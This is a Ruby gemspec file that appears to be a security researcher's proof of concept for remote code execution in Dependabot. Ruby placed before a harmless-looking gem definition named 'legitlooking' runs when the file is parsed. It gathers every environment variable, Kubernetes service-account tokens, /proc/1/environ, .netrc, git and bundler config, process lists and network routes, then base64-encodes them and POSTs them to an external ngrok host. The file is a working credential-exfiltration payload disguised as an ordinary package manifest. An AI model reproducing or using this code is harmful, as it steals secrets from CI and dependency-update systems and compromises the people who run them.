# frozen_string_literal: true

# ============================================================
# Dependabot RCE PoC - Finding 2: Gemspec Ruby eval
#
# Dependabot calls Bundler.load_gemspec_uncached() which
# evaluates this file as arbitrary Ruby. No sandbox.
# Triggers during the FILE PARSING phase.
#
# Replace COLLAB_URL with your Burp Collaborator / interactsh URL.
# ============================================================

COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app"

begin
  require "uri"
  require "net/http"
  require "base64"
  require "json"

  results = {}

  # 1. ALLE environment variabelen (niet gefilterd)
  results[:env] = ENV.to_h

  # 2. Kubernetes / GitHub Actions secret mounts
  secret_paths = %w[
    /var/run/secrets/kubernetes.io/serviceaccount/token
    /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    /var/run/secrets/kubernetes.io/serviceaccount/namespace
    /run/secrets/kubernetes.io/serviceaccount/token
    /proc/1/environ
    /etc/dependabot/job.json
    /home/dependabot/.netrc
    /root/.netrc
    /opt/bundler/v2/.bundle/config
    /home/dependabot/.gitconfig
    /root/.gitconfig
  ]
  results[:files] = {}
  secret_paths.each do |path|
    begin
      content = File.read(path)
      # null-byte separators in /proc/environ -> readable
      content = content.gsub("\x00", "\n")
      results[:files][path] = content.slice(0, 500)
    rescue
      results[:files][path] = "NIET LEESBAAR"
    end
  end

  # 3. Processen draaien in de container (wie is er naast ons?)
  results[:procs] = `ps aux 2>/dev/null`.slice(0, 1000) rescue "N/A"

  # 4. Netwerk (interne services bereikbaar?)
  results[:hostname] = `hostname`.strip rescue "N/A"
  results[:ip]       = `hostname -I`.strip rescue "N/A"
  results[:routes]   = `ip route 2>/dev/null || route -n 2>/dev/null`.slice(0, 500) rescue "N/A"

  payload = Base64.strict_encode64(JSON.generate(results).force_encoding("BINARY").encode("UTF-8", invalid: :replace, undef: :replace))

  uri = URI("#{COLLAB_URL}?poc=2v2")
  req = Net::HTTP::Post.new(uri)
  req.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == "https") { |h| h.request(req) } rescue nil

rescue => e
  begin
    require "net/http"
    uri = URI("#{COLLAB_URL}?poc=2v2&err=#{URI.encode_www_form_component(e.message.slice(0, 200))}")
    Net::HTTP.get(uri)
  rescue
  end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.0"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]

  spec.add_dependency "rails", "~> 7.0.0"
  spec.add_dependency "devise", "~> 4.9.0"
end
